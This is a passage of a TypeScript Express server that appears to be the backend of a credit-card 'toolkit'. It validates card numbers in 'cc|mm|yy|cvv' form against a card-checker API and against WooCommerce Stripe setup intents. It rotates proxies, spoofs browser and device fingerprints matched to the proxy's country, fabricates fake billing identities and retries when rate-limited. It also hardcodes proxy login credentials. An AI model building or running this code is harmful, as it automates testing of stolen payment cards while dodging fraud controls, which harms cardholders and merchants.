import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { SocksProxyAgent } from "socks-proxy-agent";
import { ProxyAgent as UndiciProxyAgent, request as undiciRequest } from "undici";
import http from "http";
import https from "https";
import path from "path";
import fs from "fs";
import crypto from "crypto";

const binCache = new Map<string, any>();

interface ProxyEntry {
  url: string;
  label: string;
  working: boolean;
  lastCheckedIp?: string;
  lastChecked?: string;
  country?: string;
  isDefault?: boolean;
}

const DEFAULT_PROXY: ProxyEntry = {
  url: "http://user-5ZQ1O7CzKyHn76tg-type-mobile-country-US:D9H3F2O9QOFVQUHm@geo.g-w.info:10080",
  label: "FloppyData Mobile US",
  working: true,
  country: "US",
  isDefault: true,
};
const proxyList: ProxyEntry[] = [DEFAULT_PROXY];
let fingerprintEnabled = false;
let activeProxyIndex = 0;
let proxyEnabled = true;

function delay(ms: number) {
  return new Promise((r) => setTimeout(r, ms));
}

function getRandomProxy(): ProxyEntry | null {
  if (!proxyEnabled) return null;
  if (activeProxyIndex >= 0 && activeProxyIndex < proxyList.length && proxyList[activeProxyIndex].working) {
    return proxyList[activeProxyIndex];
  }
  const working = proxyList.filter(p => p.working);
  if (working.length === 0) return null;
  return working[Math.floor(Math.random() * working.length)];
}

function isSocksProxy(url: string): boolean {
  const lower = url.toLowerCase();
  return lower.startsWith("socks5://") || lower.startsWith("socks4://") || lower.startsWith("socks://");
}

function normalizeProxyUrl(url: string): string {
  const lower = url.toLowerCase();
  if (lower.startsWith("socks") || lower.startsWith("http://") || lower.startsWith("https://")) {
    return url;
  }
  return `http://${url}`;
}

function randomHex(len: number): string {
  const chars = "0123456789abcdef";
  let out = "";
  for (let i = 0; i < len; i++) out += chars[Math.floor(Math.random() * 16)];
  return out;
}

interface RandomAddress {
  name: string;
  line1: string;
  city: string;
  state: string;
  postal_code: string;
  country: string;
  phone: string;
}

function generateRandomAddress(currency?: string): RandomAddress {
  const firstNames = ["James", "Mary", "Robert", "Patricia", "John", "Jennifer", "Michael", "Linda", "David", "Elizabeth", "William", "Barbara", "Richard", "Susan", "Joseph", "Jessica", "Thomas", "Sarah", "Christopher", "Karen", "Daniel", "Lisa", "Matthew", "Nancy", "Anthony", "Betty", "Mark", "Margaret", "Donald", "Sandra", "Steven", "Ashley", "Andrew", "Dorothy", "Paul", "Kimberly"];
  const lastNames = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson"];
  const name = `${firstNames[Math.floor(Math.random() * firstNames.length)]} ${lastNames[Math.floor(Math.random() * lastNames.length)]}`;

  const usAddresses = [
    { line1: "123 Main St", city: "New York", state: "NY", zip: "10001" },
    { line1: "456 Oak Ave", city: "Los Angeles", state: "CA", zip: "90001" },
    { line1: "789 Pine Rd", city: "Chicago", state: "IL", zip: "60601" },
    { line1: "321 Elm St", city: "Houston", state: "TX", zip: "77001" },
    { line1: "654 Maple Dr", city: "Phoenix", state: "AZ", zip: "85001" },
    { line1: "987 Cedar Ln", city: "Philadelphia", state: "PA", zip: "19101" },
    { line1: "147 Birch Way", city: "San Antonio", state: "TX", zip: "78201" },
    { line1: "258 Walnut Ct", city: "San Diego", state: "CA", zip: "92101" },
    { line1: "369 Spruce Blvd", city: "Dallas", state: "TX", zip: "75201" },
    { line1: "741 Willow Pl", city: "Miami", state: "FL", zip: "33101" },
    { line1: "852 Poplar St", city: "Atlanta", state: "GA", zip: "30301" },
    { line1: "963 Ash Ave", city: "Boston", state: "MA", zip: "02101" },
    { line1: "159 Cherry Ln", city: "Seattle", state: "WA", zip: "98101" },
    { line1: "753 Hickory Dr", city: "Denver", state: "CO", zip: "80201" },
    { line1: "951 Chestnut Rd", city: "Portland", state: "OR", zip: "97201" },
  ];

  const addr = usAddresses[Math.floor(Math.random() * usAddresses.length)];
  const streetNum = Math.floor(Math.random() * 9000) + 100;
  const phone = `+1${Math.floor(Math.random() * 900 + 200)}${Math.floor(Math.random() * 900 + 100)}${Math.floor(Math.random() * 9000 + 1000)}`;

  return {
    name,
    line1: `${streetNum} ${addr.line1.split(" ").slice(1).join(" ")}`,
    city: addr.city,
    state: addr.state,
    postal_code: addr.zip,
    country: "US",
    phone,
  };
}

function randomMac(): string {
  const oui = ["00:1A:2B", "00:50:56", "DC:A6:32", "B8:27:EB", "3C:22:FB", "A4:83:E7",
    "00:0C:29", "08:00:27", "F0:DE:F1", "00:1E:67", "2C:F0:5D", "E4:5F:01",
    "AC:DE:48", "00:25:96", "D8:3A:DD", "74:D0:2B", "EC:F4:BB", "44:38:39"];
  const prefix = oui[Math.floor(Math.random() * oui.length)];
  return `${prefix}:${randomHex(2).toUpperCase()}:${randomHex(2).toUpperCase()}:${randomHex(2).toUpperCase()}`;
}

function randomHash(len: number): string {
  return randomHex(len);
}

interface DeviceProfile {
  system: "Windows" | "macOS" | "Linux";
  ua: string;
  platform: string;
  chromeVersion: string;
  brands: string;
}

function generateDeviceProfile(): DeviceProfile {
  const chromeVersions = ["118", "119", "120", "121", "122", "123", "124", "125", "126", "127", "128", "129", "130", "131", "132", "133", "134", "135", "136", "137", "138", "139", "140", "141", "142", "143", "144"];
  const major = chromeVersions[Math.floor(Math.random() * chromeVersions.length)];
  const build = Math.floor(Math.random() * 9999) + 1000;
  const patch = Math.floor(Math.random() * 99);
  const fullVer = `${major}.0.${build}.${patch}`;

  const systems: Array<{ system: DeviceProfile["system"]; ua: string; platform: string }> = [
    { system: "Windows", ua: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVer} Safari/537.36`, platform: '"Windows"' },
    { system: "Windows", ua: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVer} Safari/537.36`, platform: '"Windows"' },
    { system: "Windows", ua: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVer} Safari/537.36`, platform: '"Windows"' },
    { system: "macOS", ua: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVer} Safari/537.36`, platform: '"macOS"' },
    { system: "macOS", ua: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVer} Safari/537.36`, platform: '"macOS"' },
    { system: "Linux", ua: `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVer} Safari/537.36`, platform: '"Linux"' },
  ];

  const s = systems[Math.floor(Math.random() * systems.length)];
  const brandParts = [
    [`"Not_A Brand";v="8"`, `"Chromium";v="${major}"`, `"Google Chrome";v="${major}"`],
    [`"Not/A)Brand";v="8"`, `"Chromium";v="${major}"`, `"Google Chrome";v="${major}"`],
    [`"Chromium";v="${major}"`, `"Not_A Brand";v="24"`, `"Google Chrome";v="${major}"`],
    [`"Google Chrome";v="${major}"`, `"Not:A-Brand";v="8"`, `"Chromium";v="${major}"`],
  ];
  const brands = brandParts[Math.floor(Math.random() * brandParts.length)].join(", ");

  return { ...s, chromeVersion: major, brands };
}

const WEBGL_RENDERERS = [
  "ANGLE (NVIDIA GeForce RTX 3060 Direct3D11 vs_5_0 ps_5_0)",
  "ANGLE (NVIDIA GeForce RTX 3070 Direct3D11 vs_5_0 ps_5_0)",
  "ANGLE (NVIDIA GeForce RTX 4060 Direct3D11 vs_5_0 ps_5_0)",
  "ANGLE (NVIDIA GeForce GTX 1660 Ti Direct3D11 vs_5_0 ps_5_0)",
  "ANGLE (NVIDIA GeForce RTX 2060 Direct3D11 vs_5_0 ps_5_0)",
  "ANGLE (AMD Radeon RX 6700 XT Direct3D11 vs_5_0 ps_5_0)",
  "ANGLE (AMD Radeon RX 580 Direct3D11 vs_5_0 ps_5_0)",
  "ANGLE (Intel(R) UHD Graphics 630 Direct3D11 vs_5_0 ps_5_0)",
  "ANGLE (Intel(R) Iris(R) Xe Graphics Direct3D11 vs_5_0 ps_5_0)",
  "ANGLE (Apple, ANGLE Metal Renderer: Apple M1, Unspecified Version)",
  "ANGLE (Apple, ANGLE Metal Renderer: Apple M2, Unspecified Version)",
  "ANGLE (Apple, ANGLE Metal Renderer: Apple M3, Unspecified Version)",
  "ANGLE (NVIDIA GeForce RTX 3080 Direct3D11 vs_5_0 ps_5_0)",
  "ANGLE (AMD Radeon RX 6800 XT Direct3D11 vs_5_0 ps_5_0)",
  "ANGLE (Intel(R) HD Graphics 530 Direct3D11 vs_5_0 ps_5_0)",
  "Mesa Intel(R) UHD Graphics 630 (CFL GT2)",
  "Mesa Intel(R) Xe Graphics (TGL GT2)",
  "AMD Radeon Pro 5500M OpenGL Engine",
  "Apple M1 Pro",
  "Apple GPU",
];

const WEBGL_VENDORS = [
  "Google Inc. (NVIDIA)",
  "Google Inc. (AMD)",
  "Google Inc. (Intel)",
  "Google Inc. (Apple)",
  "Google Inc.",
  "NVIDIA Corporation",
  "ATI Technologies Inc.",
  "Intel Inc.",
  "Apple",
];

const DEVICE_NAMES = [
  "DESKTOP-" + randomHex(7).toUpperCase(),
  "LAPTOP-" + randomHex(7).toUpperCase(),
  "PC-" + randomHex(8).toUpperCase(),
  "WIN-" + randomHex(8).toUpperCase(),
  "WORKSTATION-" + randomHex(5).toUpperCase(),
];

const SCREEN_RESOLUTIONS = [
  "1920x1080", "2560x1440", "1366x768", "1536x864", "1440x900",
  "1680x1050", "2560x1600", "3840x2160", "1920x1200", "3440x1440",
  "1600x900", "1280x720", "2880x1800", "1280x1024",
];

const TIMEZONES = [
  "America/New_York", "America/Chicago", "America/Denver", "America/Los_Angeles",
  "America/Toronto", "Europe/London", "Europe/Berlin", "Europe/Paris",
  "Asia/Tokyo", "Asia/Shanghai", "Australia/Sydney", "America/Sao_Paulo",
];

const LANGUAGES = [
  "en-US,en;q=0.9",
  "en-US,en;q=0.9,es;q=0.8",
  "en-GB,en;q=0.9,en-US;q=0.8",
  "en-US,en;q=0.9,fr;q=0.8",
  "en-US,en;q=0.9,de;q=0.8",
  "en,en-US;q=0.9",
  "en-US,en;q=0.9,ja;q=0.8",
  "en-CA,en;q=0.9",
  "en-AU,en;q=0.9",
  "en-US,en;q=0.9,pt;q=0.8",
  "en-US,en;q=0.9,zh;q=0.8",
  "en-US,en;q=0.9,ko;q=0.8",
];

interface GeoLocale {
  timezones: string[];
  languages: string[];
}

const COUNTRY_LOCALES: Record<string, GeoLocale> = {
  US: { timezones: ["America/New_York", "America/Chicago", "America/Denver", "America/Los_Angeles", "America/Phoenix"], languages: ["en-US,en;q=0.9", "en-US,en;q=0.9,es;q=0.8"] },
  CA: { timezones: ["America/Toronto", "America/Vancouver", "America/Edmonton", "America/Winnipeg"], languages: ["en-CA,en;q=0.9", "en-CA,en;q=0.9,fr;q=0.8"] },
  GB: { timezones: ["Europe/London"], languages: ["en-GB,en;q=0.9", "en-GB,en;q=0.9,en-US;q=0.8"] },
  UK: { timezones: ["Europe/London"], languages: ["en-GB,en;q=0.9", "en-GB,en;q=0.9,en-US;q=0.8"] },
  DE: { timezones: ["Europe/Berlin"], languages: ["de-DE,de;q=0.9,en;q=0.8", "de,en-US;q=0.9,en;q=0.8"] },
  FR: { timezones: ["Europe/Paris"], languages: ["fr-FR,fr;q=0.9,en;q=0.8", "fr,en-US;q=0.9,en;q=0.8"] },
  ES: { timezones: ["Europe/Madrid"], languages: ["es-ES,es;q=0.9,en;q=0.8"] },
  IT: { timezones: ["Europe/Rome"], languages: ["it-IT,it;q=0.9,en;q=0.8"] },
  NL: { timezones: ["Europe/Amsterdam"], languages: ["nl-NL,nl;q=0.9,en;q=0.8"] },
  BE: { timezones: ["Europe/Brussels"], languages: ["nl-BE,nl;q=0.9,fr;q=0.8,en;q=0.7", "fr-BE,fr;q=0.9,nl;q=0.8,en;q=0.7"] },
  AT: { timezones: ["Europe/Vienna"], languages: ["de-AT,de;q=0.9,en;q=0.8"] },
  CH: { timezones: ["Europe/Zurich"], languages: ["de-CH,de;q=0.9,en;q=0.8", "fr-CH,fr;q=0.9,en;q=0.8"] },
  PT: { timezones: ["Europe/Lisbon"], languages: ["pt-PT,pt;q=0.9,en;q=0.8"] },
  BR: { timezones: ["America/Sao_Paulo", "America/Fortaleza", "America/Manaus"], languages: ["pt-BR,pt;q=0.9,en;q=0.8"] },
  MX: { timezones: ["America/Mexico_City", "America/Monterrey", "America/Tijuana"], languages: ["es-MX,es;q=0.9,en;q=0.8"] },
  AR: { timezones: ["America/Argentina/Buenos_Aires"], languages: ["es-AR,es;q=0.9,en;q=0.8"] },
  JP: { timezones: ["Asia/Tokyo"], languages: ["ja-JP,ja;q=0.9,en;q=0.8", "ja,en-US;q=0.9,en;q=0.8"] },
  KR: { timezones: ["Asia/Seoul"], languages: ["ko-KR,ko;q=0.9,en;q=0.8"] },
  CN: { timezones: ["Asia/Shanghai"], languages: ["zh-CN,zh;q=0.9,en;q=0.8"] },
  TW: { timezones: ["Asia/Taipei"], languages: ["zh-TW,zh;q=0.9,en;q=0.8"] },
  HK: { timezones: ["Asia/Hong_Kong"], languages: ["zh-HK,zh;q=0.9,en;q=0.8"] },
  SG: { timezones: ["Asia/Singapore"], languages: ["en-SG,en;q=0.9,zh;q=0.8"] },
  AU: { timezones: ["Australia/Sydney", "Australia/Melbourne", "Australia/Brisbane", "Australia/Perth"], languages: ["en-AU,en;q=0.9"] },
  NZ: { timezones: ["Pacific/Auckland"], languages: ["en-NZ,en;q=0.9"] },
  IN: { timezones: ["Asia/Kolkata"], languages: ["en-IN,en;q=0.9,hi;q=0.8"] },
  RU: { timezones: ["Europe/Moscow", "Asia/Yekaterinburg", "Asia/Novosibirsk"], languages: ["ru-RU,ru;q=0.9,en;q=0.8"] },
  PL: { timezones: ["Europe/Warsaw"], languages: ["pl-PL,pl;q=0.9,en;q=0.8"] },
  SE: { timezones: ["Europe/Stockholm"], languages: ["sv-SE,sv;q=0.9,en;q=0.8"] },
  NO: { timezones: ["Europe/Oslo"], languages: ["nb-NO,nb;q=0.9,en;q=0.8"] },
  DK: { timezones: ["Europe/Copenhagen"], languages: ["da-DK,da;q=0.9,en;q=0.8"] },
  FI: { timezones: ["Europe/Helsinki"], languages: ["fi-FI,fi;q=0.9,en;q=0.8"] },
  IE: { timezones: ["Europe/Dublin"], languages: ["en-IE,en;q=0.9,ga;q=0.8"] },
  ZA: { timezones: ["Africa/Johannesburg"], languages: ["en-ZA,en;q=0.9,af;q=0.8"] },
  AE: { timezones: ["Asia/Dubai"], languages: ["ar-AE,ar;q=0.9,en;q=0.8", "en-AE,en;q=0.9,ar;q=0.8"] },
  SA: { timezones: ["Asia/Riyadh"], languages: ["ar-SA,ar;q=0.9,en;q=0.8"] },
  TR: { timezones: ["Europe/Istanbul"], languages: ["tr-TR,tr;q=0.9,en;q=0.8"] },
  IL: { timezones: ["Asia/Jerusalem"], languages: ["he-IL,he;q=0.9,en;q=0.8"] },
  TH: { timezones: ["Asia/Bangkok"], languages: ["th-TH,th;q=0.9,en;q=0.8"] },
  PH: { timezones: ["Asia/Manila"], languages: ["en-PH,en;q=0.9,tl;q=0.8"] },
  ID: { timezones: ["Asia/Jakarta"], languages: ["id-ID,id;q=0.9,en;q=0.8"] },
  MY: { timezones: ["Asia/Kuala_Lumpur"], languages: ["ms-MY,ms;q=0.9,en;q=0.8"] },
  CO: { timezones: ["America/Bogota"], languages: ["es-CO,es;q=0.9,en;q=0.8"] },
  CL: { timezones: ["America/Santiago"], languages: ["es-CL,es;q=0.9,en;q=0.8"] },
};

function extractCountryFromProxy(proxyUrl: string): string | null {
  const m = proxyUrl.match(/country-([A-Z]{2})/i);
  return m ? m[1].toUpperCase() : null;
}

function getGeoLocale(countryCode: string | null): { timezone: string; language: string } {
  if (countryCode && COUNTRY_LOCALES[countryCode]) {
    const locale = COUNTRY_LOCALES[countryCode];
    return {
      timezone: pick(locale.timezones),
      language: pick(locale.languages),
    };
  }
  return { timezone: pick(TIMEZONES), language: pick(LANGUAGES) };
}

const HARDWARE_CONCURRENCY = [2, 4, 6, 8, 10, 12, 16, 20, 24, 32];
const DEVICE_MEMORY = [2, 4, 8, 16, 32];

const AUDIO_CONTEXT_HASHES = Array.from({ length: 30 }, () => (35.7 + Math.random() * 0.3).toFixed(13));
const MEDIA_DEVICE_COUNTS = [1, 2, 3, 4, 5, 6];
const SPEECH_VOICE_COUNTS = [3, 5, 6, 8, 10, 12, 14, 16, 20, 24];

function pick<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

interface AdvancedFingerprint {
  headers: Record<string, string>;
  meta: Record<string, string>;
}

function generateFingerprint(countryCode?: string | null): Record<string, string> {
  const fp = generateAdvancedFingerprint(countryCode);
  return fp.headers;
}

function generateAdvancedFingerprint(countryCode?: string | null): AdvancedFingerprint {
  const profile = generateDeviceProfile();
  const mac = randomMac();
  const concurrency = pick(HARDWARE_CONCURRENCY);
  const memory = pick(DEVICE_MEMORY);
  const screen = pick(SCREEN_RESOLUTIONS);
  const renderer = pick(WEBGL_RENDERERS);
  const vendor = pick(WEBGL_VENDORS);
  const canvasHash = randomHash(32);
  const audioHash = pick(AUDIO_CONTEXT_HASHES);
  const clientRectsHash = randomHash(32);
  const deviceName = "DESKTOP-" + randomHex(7).toUpperCase();
  const mediaDevices = pick(MEDIA_DEVICE_COUNTS);
  const speechVoices = pick(SPEECH_VOICE_COUNTS);
  const fontHash = randomHash(16);

  const geo = getGeoLocale(countryCode || null);
  const tz = geo.timezone;
  const lang = geo.language;

  const dnt = Math.random() > 0.5 ? "1" : "0";

  const headers: Record<string, string> = {
    "User-Agent": profile.ua,
    "Accept": "*/*",
    "Accept-Language": lang,
    "Sec-Ch-Ua": profile.brands,
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": profile.platform,
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "DNT": dnt,
  };

  const meta: Record<string, string> = {
    system: profile.system,
    mac,
    deviceName,
    concurrency: String(concurrency),
    memory: `${memory}G`,
    screen,
    renderer,
    vendor,
    canvasHash,
    audioHash,
    clientRectsHash,
    fontHash,
    mediaDevices: String(mediaDevices),
    speechVoices: String(speechVoices),
    timezone: tz,
    language: lang,
    dnt,
    country: countryCode || "random",
  };

  return { headers, meta };
}

function socksHttpRequest(
  url: string,
  options: {
    method?: string;
    headers?: Record<string, string>;
    body?: string;
    agent?: any;
    timeout?: number;
  }
): Promise<{ status: number; body: string }> {
  return new Promise((resolve, reject) => {
    const isHttps = url.startsWith("https:");
    const lib = isHttps ? https : http;

    const reqOptions: any = {
      method: options.method || "GET",
      headers: options.headers || {},
    };

    if (options.agent) {
      reqOptions.agent = options.agent;
    }

    const req = lib.request(url, reqOptions, (res) => {
      let data = "";
      res.on("data", (chunk) => { data += chunk; });
      res.on("end", () => resolve({ status: res.statusCode || 200, body: data }));
    });

    req.on("error", reject);

    const timeout = options.timeout || 20000;
    req.setTimeout(timeout, () => {
      req.destroy();
      reject(new Error("Request timeout"));
    });

    if (options.body) {
      req.write(options.body);
    }
    req.end();
  });
}

async function proxyRequest(
  url: string,
  options: {
    method?: string;
    headers?: Record<string, string>;
    body?: string;
    proxyUrl?: string;
    timeout?: number;
  }
): Promise<{ status: number; body: string }> {
  if (!options.proxyUrl) {
    return socksHttpRequest(url, options);
  }

  const normalized = normalizeProxyUrl(options.proxyUrl);

  if (isSocksProxy(normalized)) {
    const agent = new SocksProxyAgent(normalized);
    return socksHttpRequest(url, { ...options, agent });
  }

  const dispatcher = new UndiciProxyAgent(normalized);
  try {
    const resp = await undiciRequest(url, {
      method: (options.method || "GET") as any,
      headers: options.headers || {},
      body: options.body || undefined,
      dispatcher,
      signal: AbortSignal.timeout(options.timeout || 20000),
    });
    const text = await resp.body.text();
    return { status: resp.statusCode, body: text };
  } finally {
    await dispatcher.close().catch(() => {});
  }
}

function resolveProxyCountry(proxy: ProxyEntry | null): string | null {
  if (!proxy) return null;
  const fromUrl = extractCountryFromProxy(proxy.url);
  if (fromUrl) return fromUrl;
  if (proxy.country && proxy.country.length === 2) return proxy.country.toUpperCase();
  return null;
}

async function fetchIpLocation(proxyUrl?: string): Promise<{ ip: string; country: string; city: string; isp: string } | null> {
  try {
    const resp = await proxyRequest("http://ip-api.com/json/?fields=query,country,countryCode,city,isp,status", { proxyUrl, timeout: 8000 });
    if (resp.status === 200) {
      const d = JSON.parse(resp.body);
      if (d.status === "success") return { ip: d.query, country: d.countryCode || "", city: d.city || "", isp: d.isp || "" };
    }
  } catch {}
  try {
    const resp = await proxyRequest("https://api.ipify.org?format=json", { proxyUrl, timeout: 8000 });
    if (resp.status === 200) {
      const d = JSON.parse(resp.body);
      return { ip: d.ip, country: "", city: "", isp: "" };
    }
  } catch {}
  return null;
}

async function checkCardChkr(data: string): Promise<any> {
  const proxy = getRandomProxy();
  const body = new URLSearchParams({ data }).toString();
  const proxyCountry = resolveProxyCountry(proxy);

  let usedMeta: Record<string, string> | null = null;

  for (let attempt = 0; attempt < 3; attempt++) {
    try {
      let headers: Record<string, string>;

      if (fingerprintEnabled) {
        const fp = generateAdvancedFingerprint(proxyCountry);
        headers = { ...fp.headers };
        usedMeta = fp.meta;
      } else {
        const profile = generateDeviceProfile();
        headers = {
          "User-Agent": profile.ua,
          "Accept": "*/*",
          "Accept-Language": "en-US,en;q=0.9",
        };
      }

      headers["Content-Type"] = "application/x-www-form-urlencoded";
      headers["Origin"] = "https://chkr.cc";
      headers["Referer"] = "https://chkr.cc/";

      const resp = await proxyRequest("https://api.chkr.cc/", {
        method: "POST",
        headers,
        body,
        proxyUrl: proxy?.url,
        timeout: 20000,
      });

      let json: any;
      try {
        json = JSON.parse(resp.body);
      } catch {
        json = { code: 2, status: "Unknown", message: resp.body.substring(0, 200) };
      }

      const msg = ((json.message || "") + " " + (json.error || "")).toLowerCase();
      const isRetryable = msg.includes("rate limit") || msg.includes("too many") || msg.includes("exceeded") || msg.includes("proxy error") || msg.includes("unable to authenticate");
      if (isRetryable && attempt < 2) {
        await delay(2000 + Math.floor(Math.random() * 2000));
        continue;
      }

      if (usedMeta) json._fingerprint = usedMeta;
      return json;
    } catch (err: any) {
      if (attempt < 2) {
        await delay(1500 + Math.floor(Math.random() * 1500));
        continue;
      }
      return { code: 2, status: "Unknown", message: err.message || "Request failed" };
    }
  }
  return { code: 2, status: "Unknown", message: "Failed after retries" };
}

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  app.get("/cc-toolkit.html", (_req, res) => {
    const filePath = path.resolve(process.cwd(), "public", "cc-toolkit.html");
    if (fs.existsSync(filePath)) {
      res.sendFile(filePath);
    } else {
      res.status(404).send("File not found");
    }
  });

  app.post("/api/check-card", async (req, res) => {
    try {
      const { data } = req.body;
      if (!data || typeof data !== "string") {
        return res.status(400).json({ error: "Missing card data" });
      }

      const json = await checkCardChkr(data);

      const normalized: any = {
        code: json.code ?? 2,
        status: json.status || "Unknown",
        message: json.message || json.status || "No response",
        card: {
          bank: json.card?.bank || "Unknown",
          type: json.card?.type || "Unknown",
          country: json.card?.country
            ? { name: json.card.country.name || json.card.country || "Unknown" }
            : { name: "Unknown" },
        },
      };
      if (json._fingerprint) normalized.fingerprint = json._fingerprint;
      return res.json(normalized);
    } catch (err: any) {
      return res.status(500).json({ code: 2, status: "Error", message: err.message || "Request failed" });
    }
  });

  app.post("/api/proxy/check", async (req, res) => {
    try {
      const { proxy } = req.body;
      if (!proxy || typeof proxy !== "string") {
        return res.status(400).json({ error: "Missing proxy URL" });
      }

      const proxyUrl = proxy.trim();

      const ipServices = [
        { url: "http://ip-api.com/json/?fields=query,country,countryCode,city,isp,status", parse: (d: any) => d.status === "success" ? { ip: d.query, country: d.countryCode || d.country || "", city: d.city || "", isp: d.isp || "" } : null },
        { url: "https://api.ipify.org?format=json", parse: (d: any) => ({ ip: d.ip, country: "", city: "", isp: "" }) },
        { url: "https://api.myip.com", parse: (d: any) => ({ ip: d.ip, country: d.country || "", city: "", isp: "" }) },
      ];

      let result: any = null;

      for (const svc of ipServices) {
        try {
          const resp = await proxyRequest(svc.url, { proxyUrl, timeout: 15000 });
          if (resp.status === 200) {
            const data = JSON.parse(resp.body);
            result = svc.parse(data);
            if (result?.ip) break;
          }
        } catch {
          continue;
        }
      }

      if (!result || !result.ip) {
        return res.json({ working: false, message: "Could not connect through proxy" });
      }

      if (!result.country && result.ip) {
        try {
          const geoResp = await proxyRequest(`https://ipinfo.io/${result.ip}/json`, { proxyUrl, timeout: 10000 });
          if (geoResp.status === 200) {
            const geoData = JSON.parse(geoResp.body);
            result.country = geoData.country || "";
            result.city = geoData.city || "";
            result.isp = geoData.org || "";
          }
        } catch {}
      }

      return res.json({
        working: true,
        ip: result.ip,
        country: result.country,
        city: result.city,
        isp: result.isp,
        message: `Connected via ${result.ip} (${result.country || "Unknown"})`,
      });
    } catch (err: any) {
      return res.json({ working: false, message: err.message || "Proxy check failed" });
    }
  });

  app.post("/api/proxy/validate", async (req, res) => {
    const proxy = getRandomProxy();
    if (!proxy) {
      return res.json({ valid: true, message: "No proxy configured (running direct)" });
    }
    try {
      const resp = await proxyRequest("http://ip-api.com/json/?fields=query,status", { proxyUrl: proxy.url, timeout: 10000 });
      if (resp.status === 200) {
        const data = JSON.parse(resp.body);
        if (data.status === "success") {
          return res.json({ valid: true, ip: data.query, proxyLabel: proxy.label });
        }
      }
      proxy.working = false;
      return res.json({ valid: false, message: "Proxy not responding" });
    } catch {
      proxy.working = false;
      return res.json({ valid: false, message: "Proxy connection failed" });
    }
  });

  app.post("/api/proxy/toggle", async (req, res) => {
    const { enabled } = req.body;
    proxyEnabled = !!enabled;
    return res.json({ success: true, proxyEnabled });
  });

  app.post("/api/proxy/set-active", async (req, res) => {
    const { index } = req.body;
    if (index === -1 || index === null || index === undefined) {
      activeProxyIndex = -1;
      return res.json({ success: true, activeIndex: -1 });
    }
    const idx = parseInt(index, 10);
    if (isNaN(idx) || idx < 0 || idx >= proxyList.length) {
      return res.status(400).json({ error: "Invalid proxy index" });
    }
    activeProxyIndex = idx;
    return res.json({ success: true, activeIndex: idx });
  });

  app.post("/api/proxy/add", async (req, res) => {
    try {
      const { proxy, label, ip, country } = req.body;
      if (!proxy || typeof proxy !== "string") {
        return res.status(400).json({ error: "Missing proxy URL" });
      }

      const proxyUrl = proxy.trim();
      const detectedCountry = country || extractCountryFromProxy(proxyUrl) || "";

      const existing = proxyList.find(p => p.url === proxyUrl);
      if (existing) {
        existing.working = true;
        existing.lastCheckedIp = ip || "";
        existing.lastChecked = new Date().toISOString();
        existing.country = detectedCountry || existing.country;
        return res.json({ success: true, proxies: proxyList });
      }

      proxyList.push({
        url: proxyUrl,
        label: label || proxyUrl.substring(0, 40),
        working: true,
        lastCheckedIp: ip || "",
        lastChecked: new Date().toISOString(),
        country: detectedCountry,
      });

      return res.json({ success: true, proxies: proxyList });
    } catch (err: any) {
      return res.status(500).json({ error: err.message || "Failed to add proxy" });
    }
  });

  app.delete("/api/proxy/:index", async (req, res) => {
    const idx = parseInt(req.params.index, 10);
    if (isNaN(idx) || idx < 0 || idx >= proxyList.length) {
      return res.status(400).json({ error: "Invalid proxy index" });
    }
    if (proxyList[idx].isDefault) {
      return res.status(400).json({ error: "Cannot remove default proxy" });
    }
    proxyList.splice(idx, 1);
    if (activeProxyIndex === idx) activeProxyIndex = -1;
    else if (activeProxyIndex > idx) activeProxyIndex--;
    return res.json({ success: true, proxies: proxyList, activeIndex: activeProxyIndex });
  });

  app.get("/api/proxy/list", async (_req, res) => {
    return res.json({ proxies: proxyList, activeIndex: activeProxyIndex, proxyEnabled });
  });

  app.post("/api/fingerprint/toggle", async (req, res) => {
    const { enabled } = req.body;
    fingerprintEnabled = !!enabled;
    return res.json({ enabled: fingerprintEnabled });
  });

  app.get("/api/fingerprint/status", async (_req, res) => {
    return res.json({ enabled: fingerprintEnabled });
  });

  app.get("/api/fingerprint/preview", async (req, res) => {
    const proxyCountry = typeof req.query.country === "string" ? req.query.country : null;
    const country = proxyCountry || resolveProxyCountry(getRandomProxy());
    const fp = generateAdvancedFingerprint(country);
    return res.json({ enabled: fingerprintEnabled, meta: fp.meta });
  });

  // ==================== STRIPE AUTH (WooCommerce Setup Intent) ====================
  app.post("/api/stripe-auth", async (req, res) => {
    const startTime = Date.now();
    try {
      const { data, siteUrl } = req.body;
      if (!data || typeof data !== "string") {
        return res.status(400).json({ status: "ERROR", message: "Missing card data" });
      }

      const parts = data.split("|");
      if (parts.length < 4) {
        return res.status(400).json({ status: "ERROR", message: "Invalid format. Use cc|mm|yy|cvv" });
      }

      const cc = parts[0].replace(/\s/g, "");
      const mm = parts[1].trim().padStart(2, "0");
      const yy = parts[2].trim().slice(-2);
      const cvv = parts[3].trim();

      const proxy = getRandomProxy();
      const proxyUrl = proxy?.url;
      const proxyCountry = resolveProxyCountry(proxy);
      const authIpPromise = fetchIpLocation(proxyUrl);

      let fpHeaders: Record<string, string>;
      let fpMeta: Record<string, string> | null = null;
      if (fingerprintEnabled) {
        const fp = generateAdvancedFingerprint(proxyCountry);
        fpHeaders = fp.headers;
        fpMeta = fp.meta;
      } else {
        const profile = generateDeviceProfile();
